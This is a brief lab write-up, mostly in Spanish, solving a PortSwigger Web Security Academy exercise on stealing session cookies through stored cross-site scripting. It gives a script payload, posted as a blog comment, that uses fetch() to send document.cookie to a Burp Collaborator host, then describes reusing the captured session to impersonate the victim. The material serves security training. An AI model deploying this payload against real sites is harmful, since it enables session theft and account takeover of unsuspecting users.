# Exploiting cross-site scripting to steal cookies

Aqui es importante conocer de antemano el funcionamiento del **burp collaborator** 

> This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

Este lab nos muestra el impacto de una vulnerabilidad de xss. Posteamos un comment con el siguiente codigo:

```text
<script>
fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

Este se envia a nuestro burp collaborator. El subdomain se extrae del mismo collaborator: 9gq1dud084zohnming0dlccaa1gs4h.burpcollaborator.net fue el mio

![](../../../.gitbook/assets/imagen%20%28939%29.png)

Le damos poll now y trae lo que recibe.

De esto nos quedamos con su session

![](../../../.gitbook/assets/imagen%20%28940%29.png)

Luego nos quedamos con esa session para nosotros a la hora de hacer nuestra peticion.

![](../../../.gitbook/assets/imagen%20%28935%29.png)







